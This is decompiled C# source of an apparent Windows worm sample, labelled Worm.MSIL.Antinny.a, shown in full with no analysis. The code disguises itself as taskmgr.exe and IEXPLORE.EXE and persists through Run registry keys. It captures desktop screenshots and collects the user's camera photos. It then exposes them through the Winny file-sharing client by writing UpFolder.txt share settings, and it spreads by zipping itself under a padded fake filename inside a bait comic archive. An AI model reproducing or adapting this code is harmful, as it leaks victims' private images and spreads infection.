// Decompiled with JetBrains decompiler
// Type: WindowsApplication2.Form1
// Assembly: WindowsApplication2, Version=1.0.1942.42864, Culture=neutral, PublicKeyToken=null
// MVID: 1F798A8A-ADED-4AFE-8C88-012ACD701081
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Worm.MSIL.Antinny.a-a31d15c2216467ce504cc220ba5aef384e797034a2924cb371ef43f0e87fd34c.exe

using java.io;
using java.util.zip;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

namespace WindowsApplication2
{
  public class Form1 : Form
  {
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Timer1")]
    private System.Timers.Timer _Timer1;
    private IContainer components;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    internal virtual System.Timers.Timer Timer1
    {
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Timer1 != null)
          this._Timer1.Elapsed -= new ElapsedEventHandler(this.Timer1_Elapsed);
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Elapsed += new ElapsedEventHandler(this.Timer1_Elapsed);
      }
      get => this._Timer1;
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Label1 == null)
          ;
        this._Label1 = value;
        if (this._Label1 == null)
          ;
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ResourceManager resourceManager = new ResourceManager(typeof (Form1));
      this.Timer1 = new System.Timers.Timer();
      this.Label1 = new Label();
      this.Timer1.BeginInit();
      this.SuspendLayout();
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 10.0;
      this.Timer1.SynchronizingObject = (ISynchronizeInvoke) this;
      this.Label1.Location = new Point(48, 40);
      this.Label1.Name = "Label1";
      Label label1 = this.Label1;
      Size size1 = new Size(72, 32);
      Size size2 = size1;
      label1.Size = size2;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Label1";
      size1 = new Size(5, 12);
      this.AutoScaleBaseSize = size1;
      size1 = new Size(292, 273);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label1);
      this.Icon = (Icon) resourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.WindowState = FormWindowState.Minimized;
      this.Timer1.EndInit();
      this.ResumeLayout(false);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
    }

    public void Timer1_Elapsed(object sender, ElapsedEventArgs e)
    {
label_1:
      int num1;
      int num2;
      int num3;
      Exception exception;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_2:
        num2 = 1;
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
label_3:
        num2 = 2;
        string directoryName = Path.GetDirectoryName(folderPath);
label_4:
        num2 = 3;
        object executablePath = (object) Application.ExecutablePath;
label_5:
        num2 = 4;
        File.Copy(StringType.FromObject(executablePath), directoryName + "\\taskmgr.exe", true);
label_6:
        num2 = 5;
        File.Copy(StringType.FromObject(executablePath), folderPath + "\\config\\IEXPLORE.EXE", true);
label_7:
        num2 = 6;
        string subkey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
label_8:
        num2 = 7;
        string name1 = "taskmgr";
label_9:
        num2 = 8;
        string name2 = "IEXPLORE";
label_10:
        num2 = 9;
        string str1 = directoryName + "\\taskmgr.exe -kira";
label_11:
        num2 = 10;
        string str2 = folderPath + "\\config\\IEXPLORE.EXE -ryuk";
label_12:
        num2 = 11;
        RegistryKey subKey1 = Registry.LocalMachine.CreateSubKey(subkey);
label_13:
        num2 = 12;
        RegistryKey subKey2 = Registry.LocalMachine.CreateSubKey(subkey);
label_14:
        num2 = 13;
        subKey1.SetValue(name1, (object) str1);
label_15:
        num2 = 14;
        subKey2.SetValue(name2, (object) str2);
label_16:
        num2 = 15;
        subKey1.Close();
label_17:
        num2 = 16;
        Console.WriteLine(str1);
label_18:
        num2 = 17;
        Directory.CreateDirectory(folderPath + "\\1035");
label_19:
        num2 = 18;
        checked { ++GetHostNameSample.tcnt; }
label_20:
        num2 = 19;
        if (StringType.StrCmp(GetHostNameSample.cline, "-ryuk", false) != 0)
          goto label_29;
label_21:
        num2 = 20;
        if (GetHostNameSample.tcnt <= 60L)
          goto label_27;
label_22:
        num2 = 21;
        this.Timer1.Interval = 10000.0;
label_23:
        num2 = 22;
        SendKeys.SendWait("^{PRTSC}");
label_24:
        num2 = 23;
        string str3 = Strings.Format((object) DateAndTime.Now, "yyMMdd_HHmm");
label_25:
        num2 = 24;
        Form1.SaveImage(folderPath + "\\1035\\[デスノート] " + GetHostNameSample.dnsname + "のデスクトップ " + str3 + ".jpg", 99);
label_26:
        num2 = 25;
        GetHostNameSample.tcnt = 0L;
label_27:
label_28:
        int num4 = 27;
        goto label_108;
label_29:
        num2 = 28;
        if (StringType.StrCmp(GetHostNameSample.cline, "-kira", false) != 0)
          goto label_108;
label_30:
        num2 = 29;
        this.Timer1.Interval = 10000.0;
label_31:
        num2 = 30;
        if (GetHostNameSample.tcnt <= 6L)
          goto label_106;
label_32:
        num2 = 31;
        string[] strArray1 = new string[1000];
label_33:
        num2 = 32;
        string[] filesMostDeep = Form1.GetFilesMostDeep(StringType.FromChar(Strings.Chr(checked ((int) GetHostNameSample.drv))) + ":\\", "winny.exe");
label_34:
        num2 = 33;
        long index1 = 0;
label_35:
        num2 = 34;
        string[] strArray2 = filesMostDeep;
        int index2 = 0;
        goto label_47;
label_37:
        num2 = 35;
        checked { ++index1; }
label_38:
        num2 = 36;
        string[] strArray3 = strArray1;
        int index3 = checked ((int) index1);
        int index4 = index3;
        string str4;
        string str5 = strArray1[index3] + str4 + Environment.NewLine;
        strArray3[index4] = str5;
label_39:
        num2 = 37;
        GetHostNameSample.wpash = Strings.Mid(strArray1[checked ((int) index1)], 1, Strings.InStrRev(strArray1[checked ((int) index1)], "\\"));
label_40:
        num2 = 38;
        Form1.DeleteFile(GetHostNameSample.wpash + "UpFolder.txt", true);
label_41:
        num2 = 39;
        File.Create(GetHostNameSample.wpash + "UpFolder.txt").Close();
label_42:
        num2 = 40;
        StreamWriter streamWriter = new StreamWriter(GetHostNameSample.wpash + "UpFolder.txt", false, Encoding.GetEncoding(932));
label_43:
        num2 = 41;
        streamWriter.Write("[up]\nPath=" + folderPath + "\\1035" + "\n" + "Trip=" + "\n");
label_44:
        num2 = 42;
        streamWriter.Close();
label_45:
        num2 = 43;
        checked { ++index2; }
label_46:
        num2 = 44;
label_47:
        if (index2 < strArray2.Length)
        {
          str4 = strArray2[index2];
          goto label_37;
        }
label_48:
        num2 = 45;
        if (!File.Exists(folderPath + "\\1035\\[一般コミック][小畑健×" + GetHostNameSample.dnsname + "] DEATH NOTE -デスノート- 第" + StringType.FromLong(checked (GetHostNameSample.drv - 98L)) + "巻.zip"))
          goto label_50;
label_49:
        num2 = 46;
        goto label_99;
label_50:
        num2 = 47;
label_51:
        num2 = 48;
        filesMostDeep = Form1.GetFilesMostDeep(StringType.FromChar(Strings.Chr(checked ((int) GetHostNameSample.drv))) + ":\\", "DSC*.jpg");
label_52:
        num2 = 49;
        index1 = 0L;
label_53:
        num2 = 50;
        string[] strArray4 = filesMostDeep;
        int index5 = 0;
        goto label_59;
label_55:
        num2 = 51;
        checked { ++index1; }
label_56:
        num2 = 52;
        string[] strArray5 = strArray1;
        int index6 = checked ((int) index1);
        int index7 = index6;
        string str6;
        string str7 = strArray1[index6] + str6 + Environment.NewLine;
        strArray5[index7] = str7;
label_57:
        num2 = 53;
        checked { ++index5; }
label_58:
        num2 = 54;
label_59:
        if (index5 < strArray4.Length)
        {
          str6 = strArray4[index5];
          goto label_55;
        }
label_60:
        num2 = 55;
        Directory.CreateDirectory(folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr(checked ((int) GetHostNameSample.drv))) + "\\");
label_61:
        num2 = 56;
        long num5 = index1;
        long Expression = 1;
        goto label_64;
label_62:
        num2 = 57;
        File.Move(strArray1[checked ((int) Expression)], folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr(checked ((int) GetHostNameSample.drv))) + "\\" + Strings.Format((object) Expression, "000") + ".jpg");
label_63:
        num2 = 58;
        checked { ++Expression; }
label_64:
        if (Expression <= num5)
          goto label_62;
label_65:
        num2 = 59;
        if (index1 <= 0L)
          goto label_98;
label_66:
        num2 = 60;
        File.Copy(StringType.FromObject(executablePath), folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr(checked ((int) GetHostNameSample.drv))) + "\\\\メール                                                                            .exe", true);
label_67:
        num2 = 61;
        string str8 = folderPath + "\\1035\\[一般コミック][小畑健×" + GetHostNameSample.dnsname + "] DEATH NOTE -デスノート- 第" + StringType.FromLong(checked (GetHostNameSample.drv - 98L)) + "巻.zip";
label_68:
        num2 = 62;
        string[] arySrc = new string[10000];
label_69:
        num2 = 63;
        long num6 = index1;
        Expression = 1L;
        goto label_72;
label_70:
        num2 = 64;
        arySrc[checked ((int) (Expression - 1L))] = folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr(checked ((int) GetHostNameSample.drv))) + "\\" + Strings.Format((object) Expression, "000") + ".jpg";
label_71:
        num2 = 65;
        checked { ++Expression; }
label_72:
        if (Expression <= num6)
          goto label_70;
label_73:
        num2 = 66;
        arySrc[checked ((int) index1)] = folderPath + "\\2124\\" + StringType.FromChar(Strings.Chr(checked ((int) GetHostNameSample.drv))) + "\\\\メール                                                                            .exe";
label_74:
        num2 = 67;
        arySrc = (string[]) Utils.CopyArray((Array) arySrc, (Array) new string[checked ((int) index1 + 1)]);
label_75:
        num2 = 68;
        FileOutputStream fileOutputStream = new FileOutputStream(str8);
label_76:
        num2 = 69;
        ZipOutputStream zipOutputStream = new ZipOutputStream((OutputStream) fileOutputStream);
label_77:
        num2 = 70;
        string[] strArray6 = arySrc;
        int index8 = 0;
        goto label_95;
label_79:
        num2 = 71;
        string path;
        string fileName = Path.GetFileName(path);
label_80:
        num2 = 72;
        ZipEntry zipEntry = new ZipEntry(fileName);
label_81:
        num2 = 73;
        zipEntry.setMethod(8);
label_82:
        num2 = 74;
        zipOutputStream.putNextEntry(zipEntry);
label_83:
        num2 = 75;
        FileInputStream fileInputStream = new FileInputStream(path);
label_84:
        num2 = 76;
        sbyte[] numArray = new sbyte[8192];
        goto label_90;
label_85:
        num2 = 79;
        int num7 = fileInputStream.read(numArray, 0, numArray.Length);
label_86:
        num2 = 80;
        if (num7 <= 0)
          goto label_91;
label_87:
label_88:
        num2 = 83;
        zipOutputStream.write(numArray, 0, num7);
label_89:
label_90:
        num2 = 78;
        if (true)
          goto label_85;
label_91:
        num2 = 85;
        fileInputStream.close();
label_92:
        num2 = 86;
        zipOutputStream.closeEntry();
label_93:
        num2 = 87;
        checked { ++index8; }
label_94:
        num2 = 88;
label_95:
        if (index8 < strArray6.Length)
        {
          path = strArray6[index8];
          goto label_79;
        }
label_96:
        num2 = 89;
        zipOutputStream.close();
label_97:
        num2 = 90;
        fileOutputStream.close();
label_98:
label_99:
label_100:
        num2 = 93;
        GetHostNameSample.tcnt = 0L;
label_101:
        num2 = 94;
        checked { ++GetHostNameSample.drv; }
label_102:
        num2 = 95;
        if (GetHostNameSample.drv != 110L)
          goto label_104;
label_103:
        num2 = 96;
        GetHostNameSample.drv = 99L;
label_104:
label_105:
        num4 = 98;
        goto label_107;
label_106:
        num2 = 99;
        ProjectData.EndApp();
label_107:
label_108:
        goto label_116;
label_109:
        int num8 = num3 + 1;
        num3 = 0;
        switch (num8)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_4;
          case 4:
            goto label_5;
          case 5:
            goto label_6;
          case 6:
            goto label_7;
          case 7:
            goto label_8;
          case 8:
            goto label_9;
          case 9:
            goto label_10;
          case 10:
            goto label_11;
          case 11:
            goto label_12;
          case 12:
            goto label_13;
          case 13:
            goto label_14;
          case 14:
            goto label_15;
          case 15:
            goto label_16;
          case 16:
            goto label_17;
          case 17:
            goto label_18;
          case 18:
            goto label_19;
          case 19:
            goto label_20;
          case 20:
            goto label_21;
          case 21:
            goto label_22;
          case 22:
            goto label_23;
          case 23:
            goto label_24;
          case 24:
            goto label_25;
          case 25:
            goto label_26;
          case 26:
            goto label_27;
          case 27:
            goto label_28;
          case 28:
            goto label_29;
          case 29:
            goto label_30;
          case 30:
            goto label_31;
          case 31:
            goto label_32;
          case 32:
            goto label_33;
          case 33:
            goto label_34;
          case 34:
            goto label_35;
          case 35:
            goto label_37;
          case 36:
            goto label_38;
          case 37:
            goto label_39;
          case 38:
            goto label_40;
          case 39:
            goto label_41;
          case 40:
            goto label_42;
          case 41:
            goto label_43;
          case 42:
            goto label_44;
          case 43:
            goto label_45;
          case 44:
            goto label_46;
          case 45:
            goto label_48;
          case 46:
            goto label_49;
          case 47:
            goto label_50;
          case 48:
            goto label_51;
          case 49:
            goto label_52;
          case 50:
            goto label_53;
          case 51:
            goto label_55;
          case 52:
            goto label_56;
          case 53:
            goto label_57;
          case 54:
            goto label_58;
          case 55:
            goto label_60;
          case 56:
            goto label_61;
          case 57:
            goto label_62;
          case 58:
            goto label_63;
          case 59:
            goto label_65;
          case 60:
            goto label_66;
          case 61:
            goto label_67;
          case 62:
            goto label_68;
          case 63:
            goto label_69;
          case 64:
            goto label_70;
          case 65:
            goto label_71;
          case 66:
            goto label_73;
          case 67:
            goto label_74;
          case 68:
            goto label_75;
          case 69:
            goto label_76;
          case 70:
            goto label_77;
          case 71:
            goto label_79;
          case 72:
            goto label_80;
          case 73:
            goto label_81;
          case 74:
            goto label_82;
          case 75:
            goto label_83;
          case 76:
            goto label_84;
          case 77:
          case 78:
            goto label_90;
          case 79:
            goto label_85;
          case 80:
            goto label_86;
          case 81:
          case 85:
            goto label_91;
          case 82:
            goto label_87;
          case 83:
            goto label_88;
          case 84:
            goto label_89;
          case 86:
            goto label_92;
          case 87:
            goto label_93;
          case 88:
            goto label_94;
          case 89:
            goto label_96;
          case 90:
            goto label_97;
          case 91:
            goto label_98;
          case 92:
            goto label_99;
          case 93:
            goto label_100;
          case 94:
            goto label_101;
          case 95:
            goto label_102;
          case 96:
            goto label_103;
          case 97:
            goto label_104;
          case 98:
            goto label_105;
          case 99:
            goto label_106;
          case 100:
            goto label_107;
          case 101:
            goto label_108;
          case 102:
            goto label_116;
        }
      }
      catch (Exception ex) when ((num1 == 0 || num3 != 0 ? 0 : 1) != 0)
      {
        ProjectData.SetProjectError(ex);
        exception = ex;
        if (num3 == 0)
        {
          num3 = num2;
          switch (num1)
          {
            case 1:
              goto label_109;
            default:
              throw;
          }
        }
      }
      throw exception;
label_116:
      if (num3 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private static ImageCodecInfo GetEncoderInfo(string mineType)
    {
      ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
      int index = 0;
      while (index < imageEncoders.Length)
      {
        ImageCodecInfo encoderInfo = imageEncoders[index];
        if (StringType.StrCmp(encoderInfo.MimeType, mineType, false) == 0)
          return encoderInfo;
        checked { ++index; }
      }
      return (ImageCodecInfo) null;
    }

    public static void SaveImage(string fileName, int quality)
    {
      IDataObject dataObject = Clipboard.GetDataObject();
      if (!dataObject.GetDataPresent(DataFormats.Bitmap))
        return;
      Bitmap data = (Bitmap) dataObject.GetData(DataFormats.Bitmap);
      EncoderParameters encoderParams = new EncoderParameters(1);
      EncoderParameter encoderParameter = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long) quality);
      encoderParams.Param[0] = encoderParameter;
      ImageCodecInfo encoderInfo = Form1.GetEncoderInfo("image/jpeg");
      string lower = Path.GetExtension(encoderInfo.FilenameExtension.Split(';')[0]).ToLower();
      string filename = Path.ChangeExtension(fileName, lower);
      data.Save(filename, encoderInfo, encoderParams);
    }

    public static void DeleteFile(string nFilePath, bool bDelReadOnly)
    {
      FileInfo fileInfo = new FileInfo(nFilePath);
      if (!fileInfo.Exists)
        return;
      if ((fileInfo.Attributes & FileAttributes.ReadOnly) > (FileAttributes) 0)
      {
        if (bDelReadOnly)
        {
          fileInfo.Attributes = FileAttributes.Normal;
          fileInfo.Delete();
        }
      }
      else
        fileInfo.Delete();
    }

    public static string[] GetFilesMostDeep(string nRootPath, string nPattern)
    {
      ArrayList arrayList = new ArrayList();
      string[] files = Directory.GetFiles(nRootPath, nPattern);
      int index1 = 0;
      while (index1 < files.Length)
      {
        string str = files[index1];
        arrayList.Add((object) str);
        checked { ++index1; }
      }
      string[] directories = Directory.GetDirectories(nRootPath);
      int index2 = 0;
      while (index2 < directories.Length)
      {
        string str = directories[index2];
        string[] filesMostDeep;
        if (StringType.StrCmp(Strings.Mid(str, 4, Strings.Len(str)), "System Volume Information", false) != 0)
          filesMostDeep = Form1.GetFilesMostDeep(str, nPattern);
        if (filesMostDeep != null)
          arrayList.AddRange((ICollection) filesMostDeep);
        checked { ++index2; }
      }
      return (string[]) arrayList.ToArray(typeof (string));
    }

    private void putFileToZip(ZipOutputStream outStream, string Path)
    {
      int num = checked ((int) FileSystem.FileLen(Path));
      BufferedInputStream bufferedInputStream = new BufferedInputStream((InputStream) new FileInputStream(Path));
      CRC32 crC32 = new CRC32();
      sbyte[] numArray = new sbyte[checked (num - 1 + 1)];
      if (bufferedInputStream.read(numArray, 0, num) != -1)
      {
        crC32.update(numArray, 0, num);
        outStream.write(numArray, 0, num);
      }
      ZipEntry zipEntry = new ZipEntry(Path.GetFileName(Path));
      zipEntry.setMethod(8);
      zipEntry.setSize((long) num);
      zipEntry.setCrc(crC32.getValue());
      outStream.putNextEntry(zipEntry);
      bufferedInputStream.close();
      outStream.closeEntry();
      ((FilterOutputStream) outStream).flush();
    }
  }
}
